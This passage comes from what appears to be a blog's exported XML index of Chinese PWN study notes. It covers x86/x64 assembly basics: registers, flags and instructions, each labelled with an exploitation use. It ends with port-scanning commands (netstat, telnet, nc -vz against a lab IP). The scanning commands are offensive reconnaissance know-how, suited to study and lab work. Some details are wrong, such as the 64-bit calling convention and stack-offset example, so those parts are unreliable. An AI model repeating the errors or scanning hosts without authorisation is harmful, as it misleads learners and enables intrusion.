即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>装载与汇编</title>
      <link href="/2025/06/80115e1b9881.html"/>
      <url>/2025/06/80115e1b9881.html</url>
      
        <content type="html"><![CDATA[<h1 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h1><p><img src="/../../../../../images/image-20250630141153683.png" alt="image-20250630141153683"></p><p><img src="/../../../../../images/image-20250630140857482.png" alt="image-20250630140857482"></p><p><img src="/../../../../../images/image-20250630141427878.png" alt="image-20250630141427878"></p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="两种语法风格"><a href="#两种语法风格" class="headerlink" title="两种语法风格"></a>两种语法风格</h2><table><thead><tr><th>功能 &#x2F; 场景</th><th>Intel 汇编格式</th><th>AT&amp;T 汇编格式</th></tr></thead><tbody><tr><td><strong>立即数传送到寄存器</strong></td><td><code>mov eax, 8</code></td><td><code>movl $8, %eax</code></td></tr><tr><td><strong>带十六进制立即数的传送</strong></td><td><code>mov ebx, 0ffffh</code></td><td><code>movl $0xffff, %ebx</code></td></tr><tr><td><strong>触发系统调用（中断）</strong></td><td><code>int 80h</code></td><td><code>int $0x80</code></td></tr><tr><td><strong>内存数据传送到寄存器</strong></td><td><code>mov eax, [ecx]</code></td><td><code>movl (%ecx), %eax</code></td></tr><tr><td><strong>函数 &#x2F; 过程（sum 示例）</strong></td><td>sum:<br/>push ebp<br/>mov ebp, esp<br/>mov eax, [ebp+12]<br/>add eax, [ebp+8]<br/>pop ebp<br/>retn<br/></td><td>sum:<br/>pushl %ebp<br/>movl %esp, %ebp<br/>movl 12(%ebp), %eax<br/>addl 8(%ebp), %eax<br/>popl %ebp<br/>ret<br/></td></tr></tbody></table><h2 id="寄存器与数据类型"><a href="#寄存器与数据类型" class="headerlink" title="寄存器与数据类型"></a>寄存器与数据类型</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><table><thead><tr><th align="left"><strong>寄存器</strong></th><th align="left"><strong>位数</strong></th><th align="left"><strong>主要功能</strong></th><th align="left"><strong>特殊用途</strong></th><th align="left"><strong>子寄存器关系</strong></th></tr></thead><tbody><tr><td align="left"><strong>RAX</strong></td><td align="left">64-bit</td><td align="left">函数返回值、算术运算</td><td align="left">系统调用号(Syscall)</td><td align="left">RAX → EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>EAX</strong></td><td align="left">32-bit</td><td align="left">累加器、算术运算主存器</td><td align="left">乘法&#x2F;除法结果存储</td><td align="left">EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>AX</strong></td><td align="left">16-bit</td><td align="left">字乘法&#x2F;字除法&#x2F;字I&#x2F;O</td><td align="left">-</td><td align="left">AX → AH(高8位)&#x2F;AL(低8位)</td></tr><tr><td align="left"><strong>AL</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法&#x2F;字节I&#x2F;O 十进制运算</td><td align="left">BCD运算</td><td align="left">AX的低字节</td></tr><tr><td align="left"><strong>AH</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法</td><td align="left">-</td><td align="left">AX的高字节</td></tr><tr><td align="left"><strong>RBX</strong></td><td align="left">64-bit</td><td align="left">通用数据存储</td><td align="left">内存寻址基址</td><td align="left">RBX → EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>EBX</strong></td><td align="left">32-bit</td><td align="left">内存寻址基址</td><td align="left">-</td><td align="left">EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>BX</strong></td><td align="left">16-bit</td><td align="left">内存指针</td><td align="left">段寄存器(DS)的默认基址</td><td align="left">BX → BH(高8位)&#x2F;BL(低8位)</td></tr><tr><td align="left"><strong>RCX</strong></td><td align="left">64-bit</td><td align="left">循环计数器</td><td align="left">REP前缀指令计数</td><td align="left">RCX → ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>ECX</strong></td><td align="left">32-bit</td><td align="left">循环计数器</td><td align="left">-</td><td align="left">ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>CX</strong></td><td align="left">16-bit</td><td align="left">串操作&#x2F;循环控制</td><td align="left">-</td><td align="left">CX → CH(高8位)&#x2F;CL(低8位)</td></tr><tr><td align="left"><strong>CL</strong></td><td align="left">8-bit</td><td align="left">移位&#x2F;旋转计数器</td><td align="left">位操作指令</td><td align="left">CX的低字节</td></tr><tr><td align="left"><strong>RDX</strong></td><td align="left">64-bit</td><td align="left">I&#x2F;O指针、数据存储</td><td align="left">除法余数存储</td><td align="left">RDX → EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>EDX</strong></td><td align="left">32-bit</td><td align="left">字乘法&#x2F;字除法 间接I&#x2F;O</td><td align="left">除法余数</td><td align="left">EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>DX</strong></td><td align="left">16-bit</td><td align="left">端口地址指针</td><td align="left">-</td><td align="left">DX → DH(高8位)&#x2F;DL(低8位)</td></tr><tr><td align="left"><strong>RSI</strong></td><td align="left">64-bit</td><td align="left">内存源指针</td><td align="left">串操作源地址</td><td align="left">RSI → ESI → SI</td></tr><tr><td align="left"><strong>ESI</strong></td><td align="left">32-bit</td><td align="left">内存源指针</td><td align="left">LODS&#x2F;MOVS等指令</td><td align="left">ESI → SI</td></tr><tr><td align="left"><strong>SI</strong></td><td align="left">16-bit</td><td align="left">串操作源指针</td><td align="left">DS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RDI</strong></td><td align="left">64-bit</td><td align="left">内存目的指针</td><td align="left">串操作目的地址</td><td align="left">RDI → EDI → DI</td></tr><tr><td align="left"><strong>EDI</strong></td><td align="left">32-bit</td><td align="left">内存目的指针</td><td align="left">STOS&#x2F;MOVS等指令</td><td align="left">EDI → DI</td></tr><tr><td align="left"><strong>DI</strong></td><td align="left">16-bit</td><td align="left">串操作目的指针</td><td align="left">ES段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RBP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">访问栈帧参数&#x2F;局部变量</td><td align="left">RBP → EBP → BP</td></tr><tr><td align="left"><strong>EBP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">函数栈帧基准</td><td align="left">EBP → BP</td></tr><tr><td align="left"><strong>BP</strong></td><td align="left">16-bit</td><td align="left">栈数据访问指针</td><td align="left">SS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RSP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">当前栈顶位置</td><td align="left">RSP → ESP → SP</td></tr><tr><td align="left"><strong>ESP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">PUSH&#x2F;POP操作</td><td align="left">ESP → SP</td></tr><tr><td align="left"><strong>SP</strong></td><td align="left">16-bit</td><td align="left">栈顶指针</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left"><strong>RIP</strong></td><td align="left">64-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">存放下一条指令地址</td><td align="left">RIP → EIP → IP</td></tr><tr><td align="left"><strong>EIP</strong></td><td align="left">32-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">控制程序执行流程</td><td align="left">EIP → IP</td></tr><tr><td align="left"><strong>IP</strong></td><td align="left">16-bit</td><td align="left">指令指针</td><td align="left">实模式下使用</td><td align="left">-</td></tr></tbody></table><h4 id="关键补充说明："><a href="#关键补充说明：" class="headerlink" title="关键补充说明："></a>关键补充说明：</h4><h5 id="寄存器层级关系："><a href="#寄存器层级关系：" class="headerlink" title="寄存器层级关系："></a>寄存器层级关系：</h5><ul><li>64位寄存器 (R开头)：<code>RAX</code>, <code>RBX</code>, <code>RCX</code>, <code>RDX</code>, <code>RSI</code>, <code>RDI</code>, <code>RBP</code>, <code>RSP</code>, <code>RIP</code></li><li>32位寄存器 (E开头)：<code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code>, <code>ESI</code>, <code>EDI</code>, <code>EBP</code>, <code>ESP</code>, <code>EIP</code></li><li>16位寄存器：<code>AX</code>, <code>BX</code>, <code>CX</code>, <code>DX</code>, <code>SI</code>, <code>DI</code>, <code>BP</code>, <code>SP</code>, <code>IP</code></li><li>8位寄存器：<code>AH</code>&#x2F;<code>AL</code>, <code>BH</code>&#x2F;<code>BL</code>, <code>CH</code>&#x2F;<code>CL</code>, <code>DH</code>&#x2F;<code>DL</code></li></ul><h5 id="Pwn-逆向中的核心寄存器："><a href="#Pwn-逆向中的核心寄存器：" class="headerlink" title="Pwn&#x2F;逆向中的核心寄存器："></a>Pwn&#x2F;逆向中的核心寄存器：</h5><ul><li><strong>RIP&#x2F;EIP</strong>：控制程序执行流（劫持核心目标）</li><li><strong>RSP&#x2F;ESP</strong>：栈指针（缓冲区溢出关键）</li><li><strong>RBP&#x2F;EBP</strong>：栈帧基准（定位局部变量&#x2F;参数）</li><li><strong>RAX&#x2F;EAX</strong>：存储系统调用号和函数返回值</li></ul><h5 id="特殊功能寄存器："><a href="#特殊功能寄存器：" class="headerlink" title="特殊功能寄存器："></a>特殊功能寄存器：</h5><ul><li><strong>段寄存器</strong>：CS（代码段）, DS（数据段）, SS（堆栈段）, ES&#x2F;FS&#x2F;GS（附加段）</li><li><strong>标志寄存器</strong>：EFLAGS&#x2F;RFLAGS（存储状态标志如ZF&#x2F;CF&#x2F;SF等）</li></ul><h5 id="寄存器使用场景："><a href="#寄存器使用场景：" class="headerlink" title="寄存器使用场景："></a>寄存器使用场景：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#函数调用示例</span><br><span class="line">push rbp            ; 保存调用者栈帧</span><br><span class="line">mov rbp, rsp        ; 建立新栈帧</span><br><span class="line">mov eax, [rbp+8]    ; 获取第一个参数</span><br><span class="line">add eax, [rbp+12]   ; 加上第二个参数</span><br><span class="line">pop rbp             ; 恢复栈帧</span><br><span class="line">ret                 ; 返回到RIP指向地址</span><br></pre></td></tr></table></figure><h5 id="64位与32位差异："><a href="#64位与32位差异：" class="headerlink" title="64位与32位差异："></a>64位与32位差异：</h5><ul><li>64位新增寄存器：R8-R15</li><li>调用约定变更：64位使用RCX&#x2F;RDX&#x2F;R8&#x2F;R9传参</li><li>内存寻址范围扩大：64位支持48位虚拟地址空间</li></ul><h5 id="栈帧："><a href="#栈帧：" class="headerlink" title="栈帧："></a>栈帧：</h5><p>一个栈帧就是保存一个函数的状态，简单来说就是一个函数所需要的栈空间.</p><p>rsp(栈顶寄存器) &#x2F;esp(栈指针寄存器)永远指向栈帧的栈顶，rbp(栈基寄存器)&#x2F;ebp(扩展基址指针寄存器)则永远指向栈帧的栈底,rip(程序计数寄存器)&#x2F;eip(指令指针寄存器)指向当前栈栈帧执行的命令。</p><p>栈从高地址向低地址开辟内存空间，所以低地址的是栈顶，而栈底的第一个栈帧在这里存放着我们的主函数的父函数，所以main函数并不是最栈顶的函数，main上面还会在编译过程中有一些库函数，但是他们并不会产生栈帧，因为栈先进后出的特性，所以当在main函数中需要调用其他函数时，就开辟一个新的函数栈帧，并存储上一个栈的栈底，当调用结束时，将现在的栈帧弹出，恢复到原来的main函数继续执行完main函数。</p><p><img src="/../../../../../images/image-20250630161338940.png" alt="image-20250630161338940"></p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h4><h5 id="表达方式："><a href="#表达方式：" class="headerlink" title="表达方式："></a>表达方式：</h5><table><thead><tr><th align="left"><strong>进制</strong></th><th align="left"><strong>前缀</strong></th><th align="left"><strong>示例</strong></th><th align="left">汇编表示</th></tr></thead><tbody><tr><td align="left"><strong>十进制</strong></td><td align="left">无</td><td align="left"><code>12345</code></td><td align="left"><code>mov eax, 12345</code></td></tr><tr><td align="left"><strong>十六进制</strong></td><td align="left"><code>0x</code></td><td align="left"><code>0xDEADBEEF</code></td><td align="left"><code>mov ebx, 0xDEADBEEF</code></td></tr><tr><td align="left"><strong>八进制</strong></td><td align="left"><code>0</code></td><td align="left"><code>0755</code></td><td align="left"><code>mov ecx, 0755</code></td></tr><tr><td align="left"><strong>二进制</strong></td><td align="left"><code>0b</code></td><td align="left"><code>0b10101010</code></td><td align="left"><code>mov dl, 0b10101010</code></td></tr></tbody></table><h5 id="内存存储（小端序）："><a href="#内存存储（小端序）：" class="headerlink" title="内存存储（小端序）："></a>内存存储（小端序）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">0x12345678</span>;  <span class="comment">// 32位整数</span></span><br><span class="line"><span class="comment">// 内存布局（地址递增）：</span></span><br><span class="line">Address: <span class="number">0x1000</span> → <span class="number">0x78</span></span><br><span class="line">Address: <span class="number">0x1001</span> → <span class="number">0x56</span></span><br><span class="line">Address: <span class="number">0x1002</span> → <span class="number">0x34</span></span><br><span class="line">Address: <span class="number">0x1003</span> → <span class="number">0x12</span></span><br></pre></td></tr></table></figure><h4 id="浮点数常量"><a href="#浮点数常量" class="headerlink" title="浮点数常量"></a>浮点数常量</h4><h5 id="IEEE-754标准："><a href="#IEEE-754标准：" class="headerlink" title="IEEE 754标准："></a>IEEE 754标准：</h5><table><thead><tr><th align="left"><strong>类型</strong></th><th align="left"><strong>总位数</strong></th><th align="left"><strong>符号位</strong></th><th align="left"><strong>指数位</strong></th><th align="left"><strong>尾数位</strong></th><th align="left"><strong>范围</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left"><strong>float</strong></td><td align="left">32-bit</td><td align="left">1 bit</td><td align="left">8 bits</td><td align="left">23 bits</td><td align="left">±3.4e38</td><td align="left"><code>3.14f</code></td></tr><tr><td align="left"><strong>double</strong></td><td align="left">64-bit</td><td align="left">1 bit</td><td align="left">11 bits</td><td align="left">52 bits</td><td align="left">±1.7e308</td><td align="left"><code>2.71828</code></td></tr></tbody></table><h5 id="内存布局（float示例）："><a href="#内存布局（float示例）：" class="headerlink" title="内存布局（float示例）："></a>内存布局（float示例）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> pi = <span class="number">3.14159</span>;  <span class="comment">// 十六进制: 0x40490FD0</span></span><br><span class="line"><span class="comment">// 内存结构（小端序）：</span></span><br><span class="line"><span class="number">0x0000</span>: D0  <span class="comment">// 尾数低位</span></span><br><span class="line"><span class="number">0x0001</span>: <span class="number">0F</span>  </span><br><span class="line"><span class="number">0x0002</span>: <span class="number">49</span>  <span class="comment">// 尾数高位 + 指数低位</span></span><br><span class="line"><span class="number">0x0003</span>: <span class="number">40</span>  <span class="comment">// 符号(0) + 指数高位</span></span><br></pre></td></tr></table></figure><h4 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h4><h5 id="内存表示："><a href="#内存表示：" class="headerlink" title="内存表示："></a>内存表示：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *str = <span class="string">&quot;Hello Pwn!&quot;</span>; </span><br><span class="line"><span class="comment">// 内存布局：</span></span><br><span class="line">Address: <span class="number">0x4000</span> → <span class="string">&#x27;H&#x27;</span> (<span class="number">0x48</span>)</span><br><span class="line">Address: <span class="number">0x4001</span> → <span class="string">&#x27;e&#x27;</span> (<span class="number">0x65</span>)</span><br><span class="line">...</span><br><span class="line">Address: <span class="number">0x4009</span> → <span class="string">&#x27;!&#x27;</span> (<span class="number">0x21</span>)</span><br><span class="line">Address: <span class="number">0x400A</span> → <span class="number">0x00</span>  <span class="comment">// NULL终止符</span></span><br></pre></td></tr></table></figure><h5 id="汇编定义："><a href="#汇编定义：" class="headerlink" title="汇编定义："></a>汇编定义：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &#x27;Hello Pwn!&#x27;, 0x0A, 0  ; 带换行符的字符串</span><br><span class="line">section .text</span><br><span class="line">    mov rsi, msg   ; 字符串地址 → RSI</span><br><span class="line">    mov rdx, 11    ; 长度(包括换行)</span><br><span class="line">    syscall        ; Linux写系统调用</span><br></pre></td></tr></table></figure><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><strong>·进位标志CF(Carry Flag):</strong><br>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高 位产生了一个进位或借位，那么，其值为1，否则其值为0。<br><strong>·奇偶标志PF(Parity Flag):</strong><br>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。<br><strong>·辅助进位标志AF(Auxiliary Carry Flag)：</strong><br>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0(在字操作时，发生低字节向高字节进位或借位时；在字节操作时，发生低4位向高4位进位或借位时)。<br><strong>·零标志ZF(ZeroFlag):</strong><br>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br><strong>·符号标志SF(Sign Flag):</strong><br>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。<br><strong>·溢出标志OF(Overflow Flag):</strong><br>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 </p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h3 id="常用指令表"><a href="#常用指令表" class="headerlink" title="常用指令表"></a>常用指令表</h3><table><thead><tr><th align="left"><strong>指令类型</strong></th><th align="left"><strong>指令</strong></th><th align="left"><strong>语法</strong></th><th align="left"><strong>功能描述</strong></th><th align="left"><strong>标志位影响</strong></th><th align="left"><strong>Pwn应用场景</strong></th></tr></thead><tbody><tr><td align="left"><strong>数据传送</strong></td><td align="left"><code>MOV</code></td><td align="left"><code>MOV 目标, 源</code></td><td align="left">将源操作数复制到目标</td><td align="left"><strong>无影响</strong></td><td align="left">构造ROP链、寄存器控制</td></tr><tr><td align="left"></td><td align="left"><code>LEA</code></td><td align="left"><code>LEA 目标, [内存]</code></td><td align="left">加载有效地址（不访问内存）</td><td align="left"><strong>无影响</strong></td><td align="left">计算地址绕过ASLR</td></tr><tr><td align="left"><strong>算术运算</strong></td><td align="left"><code>ADD</code></td><td align="left"><code>ADD 目标, 源</code></td><td align="left">目标 &#x3D; 目标 + 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">整数溢出漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>SUB</code></td><td align="left"><code>SUB 目标, 源</code></td><td align="left">目标 &#x3D; 目标 - 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">内存地址计算</td></tr><tr><td align="left"></td><td align="left"><code>INC</code></td><td align="left"><code>INC 目标</code></td><td align="left">目标 &#x3D; 目标 + 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">计数器修改</td></tr><tr><td align="left"></td><td align="left"><code>DEC</code></td><td align="left"><code>DEC 目标</code></td><td align="left">目标 &#x3D; 目标 - 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">循环控制</td></tr><tr><td align="left"><strong>逻辑运算</strong></td><td align="left"><code>AND</code></td><td align="left"><code>AND 目标, 源</code></td><td align="left">目标 &#x3D; 目标 &amp; 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位掩码操作</td></tr><tr><td align="left"></td><td align="left"><code>OR</code></td><td align="left"><code>OR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 | 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位设置</td></tr><tr><td align="left"></td><td align="left"><code>XOR</code></td><td align="left"><code>XOR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 ^ 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">清零寄存器(<code>XOR EAX, EAX</code>)</td></tr><tr><td align="left"></td><td align="left"><code>NOT</code></td><td align="left"><code>NOT 目标</code></td><td align="left">目标 &#x3D; ~目标</td><td align="left"><strong>无影响</strong></td><td align="left">位翻转</td></tr><tr><td align="left"><strong>控制转移</strong></td><td align="left"><code>CALL</code></td><td align="left"><code>CALL 地址</code></td><td align="left">1. 压入返回地址 2. 跳转到目标地址</td><td align="left"><strong>无影响</strong></td><td align="left">函数调用劫持</td></tr><tr><td align="left"></td><td align="left"><code>RET</code></td><td align="left"><code>RET [n]</code></td><td align="left">1. 弹出返回地址 2. 跳转到该地址 3. 可选栈调整</td><td align="left"><strong>无影响</strong></td><td align="left">栈溢出利用</td></tr><tr><td align="left"></td><td align="left"><code>JMP</code></td><td align="left"><code>JMP 地址</code></td><td align="left">无条件跳转</td><td align="left"><strong>无影响</strong></td><td align="left">程序流劫持</td></tr><tr><td align="left"><strong>比较测试</strong></td><td align="left"><code>CMP</code></td><td align="left"><code>CMP 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 - 操作数2)</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">条件分支漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>TEST</code></td><td align="left"><code>TEST 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 &amp; 操作数2)</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">权限检查绕过</td></tr><tr><td align="left"><strong>栈操作</strong></td><td align="left"><code>PUSH</code></td><td align="left"><code>PUSH 源</code></td><td align="left">1. ESP -&#x3D; 4&#x2F;8 2. [ESP] &#x3D; 源</td><td align="left"><strong>无影响</strong></td><td align="left">栈帧构造</td></tr><tr><td align="left"></td><td align="left"><code>POP</code></td><td align="left"><code>POP 目标</code></td><td align="left">1. 目标 &#x3D; [ESP] 2. ESP +&#x3D; 4&#x2F;8</td><td align="left"><strong>无影响</strong></td><td align="left">ROP gadget利用</td></tr><tr><td align="left"><strong>系统调用</strong></td><td align="left"><code>INT</code></td><td align="left"><code>INT n</code></td><td align="left">触发软件中断</td><td align="left"><strong>影响所有</strong></td><td align="left">系统调用利用</td></tr><tr><td align="left"></td><td align="left"><code>SYSCALL</code></td><td align="left"><code>SYSCALL</code></td><td align="left">快速系统调用</td><td align="left"><strong>影响所有</strong></td><td align="left">现代漏洞利用</td></tr></tbody></table><h3 id="关键指令深度解析"><a href="#关键指令深度解析" class="headerlink" title="关键指令深度解析"></a>关键指令深度解析</h3><h4 id="MOV-vs-LEA"><a href="#MOV-vs-LEA" class="headerlink" title="MOV vs LEA"></a>MOV vs LEA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; MOV - 内存访问</span><br><span class="line">mov eax, [ebx]   ; 将ebx指向的内存内容加载到eax</span><br><span class="line"></span><br><span class="line">; LEA - 不访问内存</span><br><span class="line">lea eax, [ebx+8] ; 计算地址值ebx+8并存入eax（不读取内存）</span><br></pre></td></tr></table></figure><p><strong>Pwn应用</strong>：LEA常用于计算地址偏移，绕过ASLR</p><h4 id="CMP与条件跳转"><a href="#CMP与条件跳转" class="headerlink" title="CMP与条件跳转"></a>CMP与条件跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp eax, 100     ; 比较eax和100</span><br><span class="line">jg  overflow     ; 若eax &gt; 100则跳转</span><br></pre></td></tr></table></figure><p><strong>标志位关系</strong>：</p><table><thead><tr><th align="left"><strong>跳转指令</strong></th><th align="left"><strong>含义</strong></th><th align="left"><strong>检查标志</strong></th></tr></thead><tbody><tr><td align="left"><code>JE/JZ</code></td><td align="left">相等&#x2F;零</td><td align="left">ZF&#x3D;1</td></tr><tr><td align="left"><code>JNE/JNZ</code></td><td align="left">不等&#x2F;非零</td><td align="left">ZF&#x3D;0</td></tr><tr><td align="left"><code>JG/JNLE</code></td><td align="left">大于</td><td align="left">ZF&#x3D;0且SF&#x3D;OF</td></tr><tr><td align="left"><code>JL/JNGE</code></td><td align="left">小于</td><td align="left">SF≠OF</td></tr></tbody></table><h4 id="CALL-RET-机制"><a href="#CALL-RET-机制" class="headerlink" title="CALL-RET 机制"></a>CALL-RET 机制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call func:   ; 相当于</span><br><span class="line">  push eip+5 ; 压入返回地址(下条指令)</span><br><span class="line">  jmp func</span><br><span class="line"></span><br><span class="line">ret:        ; 相当于</span><br><span class="line">  pop eip   ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong>：缓冲区溢出覆盖返回地址</p><h4 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 函数序言</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line"></span><br><span class="line">; 函数尾声</span><br><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p><strong>Pwn意义</strong>：栈帧结构是缓冲区溢出的基础</p><h4 id="TEST指令妙用"><a href="#TEST指令妙用" class="headerlink" title="TEST指令妙用"></a>TEST指令妙用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test eax, eax  ; 检查eax是否为0</span><br><span class="line">jz   exit      ; 为零则跳转</span><br><span class="line"></span><br><span class="line">test al, 1     ; 检查最低位</span><br><span class="line">jnz  odd       ; 为奇数则跳转</span><br></pre></td></tr></table></figure><h3 id="汇编与高级语言的对应关系"><a href="#汇编与高级语言的对应关系" class="headerlink" title="汇编与高级语言的对应关系"></a>汇编与高级语言的对应关系</h3><p> C 语言与汇编（x86-64）的简单映射示例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> result = add(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; add函数</span><br><span class="line">add:</span><br><span class="line">    MOV EAX, ECX      ; 第一个参数(a)从ECX移入EAX</span><br><span class="line">    ADD EAX, EDX      ; EAX += 第二个参数(b)</span><br><span class="line">    RET               ; 返回EAX的值</span><br><span class="line"></span><br><span class="line">; main函数</span><br><span class="line">main:</span><br><span class="line">    MOV ECX, 3        ; 第一个参数3存入ECX</span><br><span class="line">    MOV EDX, 4        ; 第二个参数4存入EDX</span><br><span class="line">    CALL add          ; 调用add函数</span><br><span class="line">    XOR EAX, EAX      ; EAX = 0（返回值）</span><br><span class="line">    RET</span><br></pre></td></tr></table></figure><p>第一二章 前言-汇编的概念：<a href="http://fynote.com/s/3251">http://fynote.com/s/3251</a><br>第三章 寄存器：<a href="http://fynote.com/s/3269">http://fynote.com/s/3269</a><br>第四章 汇编程序：<a href="http://fynote.com/s/3315">http://fynote.com/s/3315</a><br>第五章 汇编指令：<a href="http://fynote.com/s/3354">http://fynote.com/s/3354</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 2-汇编基础 </category>
          
          <category> x86x64汇编基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/2167c014e2bb.html"/>
      <url>/2025/06/2167c014e2bb.html</url>
      
        <content type="html"><![CDATA[<p>title: 端口服务信息<br>date: 2025-06-29 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="扫描的思路和代码实现"><a href="#扫描的思路和代码实现" class="headerlink" title="扫描的思路和代码实现"></a>扫描的思路和代码实现</h1><h2 id="一个服务一个端口"><a href="#一个服务一个端口" class="headerlink" title="一个服务一个端口"></a>一个服务一个端口</h2><h2 id="查看本机端口信息"><a href="#查看本机端口信息" class="headerlink" title="查看本机端口信息"></a>查看本机端口信息</h2><h6 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h6><p>netstat -aon|findstr 3306</p><h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h6><p>netstat -an|grep 3306</p><p>若未显示结果，说明对应服务未启动（如示例中的MySQL和80端口服务）</p><h2 id="远程机器端口"><a href="#远程机器端口" class="headerlink" title="远程机器端口"></a>远程机器端口</h2><p>telnet 192.168.142.130 80</p><p>wget 192.168.142.130 80</p><p>nc -vz 192.168.142.130 445</p><p>python代码扫描 wscan.py（批量扫描）</p><p>nc -vz 192.168.142.130 80-9000（netcat有扫描功能，能显示服务名称）</p><h1 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h1><p><a 